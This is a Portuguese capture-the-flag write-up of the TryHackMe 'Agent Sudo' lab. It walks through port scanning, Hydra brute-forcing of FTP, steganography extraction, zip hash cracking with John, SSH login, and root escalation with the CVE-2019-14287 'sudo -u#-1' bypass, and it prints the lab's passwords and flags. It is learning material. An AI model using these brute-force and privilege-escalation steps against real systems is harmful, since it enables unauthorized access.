# Primeira etapa
## Escaneamento de portas

A primeira coisa que eu fiz foi escanear as portas para ver quais delas estavam abertas. O seguinte resultado foi visto:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# nmap 10.10.8.6 -sV -O
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-27 16:32 -03
Nmap scan report for 10.10.8.6
Host is up (0.26s latency).                                                  
Not shown: 997 closed tcp ports (reset)                                      
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/27%OT=21%CT=1%CU=41046%PV=Y%DS=2%DC=I%G=Y%TM=61F2F38
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ(
OS:SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=
OS:M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=68
OS:DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.52 seconds

```

Máquina: Pessoa
Vulnerabilidade: Pele da pessoa 
Exploit: Arma
Payload: Bala
Exploit + Payload = Artefato malicioso

user-agent: Quando você tá usando um usuário e você sabe qual o browser que está sendo usado.

## Descobrindo uma nova página
A porta 80 (http) aberta indicava que havia um servidor rodando nessa máquina, por isso fui analisar no navegador e encontrei a seguinte página:

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

Passei então para a próxima *flag*  que seria descobrir o nome do usuário por meio de uma página escondida. Para isso, procurei maneiras de encontrar um usuário ou páginas escondidas no HTML, mas não obtive sucesso. Encontrei uma maneira utilizando o user agent switcher and manager. Trocando o user-agent por C e reiniciando a página, descobri uma página com a seguinte descrição:

```
http://10.10.61.20/agent_C_attention.php
```

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

Assim, eu descobri que o nome do user-agent C é chris

# Segunda etapa
## Descobrindo a senha FTP do chris

Para isso, eu utilizei o xhydra e utilizei a wordlist do John the ripper e consegui a seguinte saída

```
[21][ftp] host: 10.10.72.61   login: chris   password: crystal
<finished>
```

Para usar hydra usei [esse artigo](https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/) como suporte

## acessando o servidor FTP

Para acessar o servidor eu utilizei o comando

```
ftp <id_maquina>
```

Assim, eu digitei o login e a senha do usuário e consegui entrar.

Ao acessar, usei o comando 'ls' para listar arquivos importantes e isso me mostrou os seguintes arquivos:

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.

```

Para conseguir uma cópia desses arquivos, utilizei [este tutorial](https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/) para me mostrar comandos dentro do servidor FTP

## Analisando os itens

O primeiro item que analisei foi o arquivo .txt que me mostrou a seguinte mensagem

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Logo vi que poderia utilizar uma ferramenta para ver se algo estava escondido nessas fotos (esteganografia). Tentei utilizar uma ferramenta ao invés de exiftool: steghide, mas não encontrei nada. Olhando as dicas, vi uma nova ferramenta chamada binwalk e resolvi testar e o seguinte resultado foi visto:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# binwalk cutie.png                                                                                1 ⨯

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Vi, então, que havia um arquivo zipado 

Extrai o arquivo utilizando

```
bonwalk -e cutie.png
```

Comecei a analisar o arquivo 365 e vi o seguinte resultado:

```
)$     +++++++++
%#▒+++++++++++++++++++▒!!       ++++++++++++++++++++++++++++
▒ +++++++++++++++++++++++++++++++++++   #       +++++++++++++++++++++++++++++++++++++++++
        +++++++++++++++++++++++++++++++++++++++++++++
                                                      
'+++++++++++++++++++++++++++++++++++++++++++++++++++++&
+++++++++++++++++++++++++++++++++++++++++++++++++++++++▒++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++!'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++~ul++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++~��܎syrrmys����l++++++++++++++++++++++++++++++▒++++++++++++++++++++++++++++u��y=<66==888==6:>2s��~++++++++++++++++++++++++++++++++++++++++++++++++++++++\��O6L62,,,,,,,,,,,,,2:L=rܠ+++++++++++++++++++++++++++++++++++++++++++++++++\��8L62,,,,,,,,,,,,,,,,,,,86L4��++++++++++++++++++++++++
++++++++++++++++++++++++��2>84,,,,,,,,,,,,,,,,,,,,,,,48>M��++++++++++++++++++++++++▒+++++++++++++++++++++b�O>8,,,,,,,,,,,,,,,,,,,,,,,,,,,4,=>9�\+++++++++++++++++++++++ ++++++++++++++++++++++u�<=,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,==�~++++++++++++++++++++++

...
...
...

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++▒++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++▒
                                          ▒+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++▒++++++++++++++++++++++++++++++++++++++++++++++++++++++    ▒
                                                         #'++++++++++++++++++++++++++++++++++++++++++++++++▒+++++++++++++++++++++++++++++++++++++++++

 )
+++++++++++++++++++++++++++++++++++



++++++++++
 $$(!"      
```

o 365.zlib também não havia muitas informações, por isso pensei em analisar o outro que não estava criptografado, mas sem sucesso.

## Crackeando a senha

Agora era o momento de analisar o documento e descobrir a senha do arquivo ZIP. Primeiro, eu converti o arquivo zip em um hash da seguinte maneira:

Primeiro eu converti o ZIP para um hash

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# zip2john _cutie.png.extracted/8702.zip > hash.txt
```

Após converter, utilizei o comando a seguir para crackear a senha:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# john -wordlist=rockyou.txt  hash.txt                                                             1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2022-01-28 18:41) 1.136g/s 26690p/s 26690c/s 26690C/s azulita..16161616
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Usando a senha 'alien' consegui acessar o arquivo e ler o .txt que havia.

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

usando o cyberchef, encontrei 'Area51' que é a senha, aparentemente.

## Procurando o usuário 'J'
Após isso, utilizei uma wordlist do meu computador. Apenas filtrarei os nomes para que contivessem os nomes que começassem por 'J' (utilizei a recomendação do Breno para isso).

Vi que a lista de nomes possuia os seguintes nomes:

```
──(ellie㉿Asgard)-[~/Desktop]
└─$ cat apache-user-enum-1.0.txt         
# apache-user-enum-1.0.txt
#
# Copyright 2007 James Fisher
#
# This work is licensed under the Creative Commons 
# Attribution-Share Alike 3.0 License. To view a copy of this 
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ 
# or send a letter to Creative Commons, 171 Second Street, 
# Suite 300, San Francisco, California, 94105, USA.
#
# Unordered list of ~XXXXXX based on known accounts
# Good at finding default accounts
#

~root
~toor
~bin
~daemon
~adm
~lp
~sync
~shutdown
~halt
~mail
~pop
~postmaster
~news
~uucp
~operator
~games
~gopher
~ftp
~nobody
~nscd
~mailnull
~ident
~rpc
~rpcuser
~xfs
~gdm
~apache
~http
~web
~www
~adm
~admin
~administrator
~guest
~firewall
~fwuser
~fwadmin
~fw
~test
~testuser
~user
~user1
~user2
~user3
~user4
~user5
~sql
~data
~database
~anonymous
~staff
~office
~help
~helpdesk
~reception
~system
~operator
~backup
~aaron
~ab
~abba
~abbe
~abbey
~abbie
~root
~abbot
~abbott
~abby
~abdel
~abdul
~abe
~abel
~abelard
~abeu
~abey
~abie
~abner
~abraham
~abrahan
~abram
~abramo
~abran
~ad
~adair
~adam
~adamo
~adams
~adan
~addie
~addison
~addy
~ade
~adelbert
~adham
~adlai
~adler
~ado
~adolf
~adolph
~adolphe
~adolpho
~adolphus
~adrian
~adriano
~adrien
~agosto
~aguie
~aguistin
~aguste
~agustin
~aharon
~ahmad
~ahmed
~ailbert
~akim
~aksel
~al
~alain
~alair
~alan
~aland
~alano
~alanson
~alard
~alaric
~alasdair
~alastair
~alasteir
~alaster
~alberik
~albert
~alberto
~albie
~albrecht
~alden
~aldin
~aldis
~aldo
~aldon
~aldous
~aldric
~aldrich
~aldridge
~aldus
~aldwin
~alec
~alejandro
~alejoa
~aleksandr
~alessandro
~alex
~alexander
~alexandr
~alexandre
~alexandro
~alexandros
~alexei
~alexio
~alexis
~alf
~alfie
~alfons
~alfonse
~alfonso
~alford
~alfred
~alfredo
~alfy
~algernon
~ali
~alic
~alick
~alisander
~alistair
~alister
~alix
~allan
~allard
~allayne
~allen
~alley
~alleyn
~allie
~allin
~allister
~allistir
~allyn
~aloin
~alon
~alonso
~alonzo
~aloysius
~alphard
~alphonse
~alphonso
~alric
~aluin
~aluino

...
...
...

```

Porém, por começar com um '~' eu decidi editar o texto de todas as linhas.

utilizei o comando:

```
cut -c 2- apache-user-enum-1.0.txt > names.txt
```

Que iria imprimir todas as linhas a partir da segunda coluna de cada linha do texto.

Após isso, salvei o arquivo utilizando o comando:

```
cat names.txt | grep ^j > names_j.txt
```

Agora vou começar a usar o xhydra para descobrir o usuário cuja a senha é Area51.

A senha Area51 não é a correta para este caso.

Retornarei para revisar a outra foto.

## Analisando a segunda imagem
Agora que revi a segunda imagem, vi que havia um arquivo escondido nele com a ferramenta steghide. Ele exigia uma senha, por isso utilizei a 'Area51' e o resultado foi o seguinte:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# steghide info cute-alien.jpg  
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Depois disso, eu extraí o arquivo que eu encontrei da imagem e o arquivo continha a seguinte mensagem:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# steghide extract -sf  cute-alien.jpg                                                             1 ⨯
Enter passphrase: 
wrote extracted data to "message.txt".
```

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Assim, achei o nome 'James' e a senha 'hackerrules'

# Terceira etapa

## Descobrindo a flag
Anteriormente eu descobri que a senha do SSH é hackerrules. Antes de fazer algo, fui procurar o que seria um servidor SSH. Usei [este artigo](https://phoenixnap.com/kb/ssh-to-connect-to-remote-server-linux-or-windows) para me ajudar.

Para entrar no servidor SSH, usei o comando a seguir e digitei a senha:

```
┌──(ellie㉿Asgard)-[~]
└─$ ssh james@10.10.244.8                                                                       148 ⨯ 2 ⚙
james@10.10.244.8's password: 
Permission denied, please try again.
james@10.10.244.8's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 31 18:15:25 UTC 2022

  System load:  0.0               Processes:           95
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.244.8
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019

```

Ao entrar, vi dois arquivos. Uma imagem e um arquivo .txt. A primeira coisa que fiz foi abrir o arquivo .txt e a seguinte mensagem apareceu:

```
b03d975e8c92a7c04146cfa7a5a313c7
```

Logo vi que esse texto é a flag do exercício.

## Descobrindo o incidente

Primeiro, quis visualizar essa foto na minha máquina. Por isso, fiz uma cópia dela usando o comando:

```
┌──(ellie㉿Asgard)-[~/Desktop]
└─$ scp james@10.10.17.249:/home/james/Alien_autospy.jpg Alien_autospy.jpg                            1 ⨯
james@10.10.17.249's password: 
Alien_autospy.jpg 
```

Assim, a cópia foi para a minha área de trabalho.

Quando ela foi para lá, pude realizar minhas análises. Comecei com o exiftool que me retornou as seguintes informações:

```
┌──(ellie㉿Asgard)-[~/Desktop]
└─$ exiftool Alien_autospy.jpg                                                                        1 ⨯
ExifTool Version Number         : 12.39
File Name                       : Alien_autospy.jpg
Directory                       : .
File Size                       : 41 KiB
File Modification Date/Time     : 2022:01:31 15:39:05-03:00
File Access Date/Time           : 2022:01:31 15:39:06-03:00
File Inode Change Date/Time     : 2022:01:31 15:39:05-03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 75%
XMP Toolkit                     : Adobe XMP Core 5.0-c061 64.140949, 2010/12/07-10:57:01
Creator Tool                    : Adobe Photoshop CS5.1 Macintosh
Instance ID                     : xmp.iid:9C93922F8AE411E9BC49D707FF8214D7
Document ID                     : xmp.did:9C9392308AE411E9BC49D707FF8214D7
Derived From Instance ID        : xmp.iid:9630A2E68ADA11E9BC49D707FF8214D7
Derived From Document ID        : xmp.did:9C93922E8AE411E9BC49D707FF8214D7
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1000
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1000x300
Megapixels                      : 0.300
```

No entanto, nada me pareceu relevante nesse momento. Continuei com minhas análises com binwalk:

```
┌──(ellie㉿Asgard)-[~/Desktop]
└─$ binwalk Alien_autospy.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
```

Não sabia ao certo o que seriam essas informações, por isso decidi extrair por meio do binwalk, como fiz um pouco acima. Novamente, sem sucesso.

Fui então atrás de fazer uma Reverse search no google, que me retornou alguns resultados interessantes, incluindo o resultado do fox news que dizia que o nome da imagem era 'Roswell alien autopsy', que é o nome correto da imagem.

# Quarta etapa
## Descobrindo o número CVE

Segui as orientações de uma pessoa que realizou esse desafio e rodei o seguinte comando:

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Aqui, vi que o usuário não tem a permissão de root para rodar /bin/hash. Descobri isso, após ver !root na última linha.

Após isso, fui analisar o exploit para (all, !root) /bin/bash e encontrei o seguinte [link](https://www.exploit-db.com/exploits/47502)

Tentei então me dar a permissão para rodar no /bin/hash, utilizando o comando que foi mostrado no artigo:

```
sudo -u#-1 /bin/bash
```

O resultado foi o seguinte:

```
root@agent-sudo:~# sudo -l
Matching Defaults entries for root on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on agent-sudo:
    (ALL : ALL) ALL
```

Agora eu rodei o comando whoami e ao invés de james, tive este resultado:

```
root@agent-sudo:~# whoami
root
```

Agora eu posso entrar na pasta root. Quando entrei, verifiquei o que tinha naquela pasta e encontrei um arquivo texto. Quando o abri, vi o seguinte:

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

Para saber qual o número de CVE, eu olhei novamente no link do exploit e o vi catalogado como cve-2019-14287

## Descobrindo quem é o agente R

No bilhete deixado por ele, podemos ver que o nome do agente R é DesKel.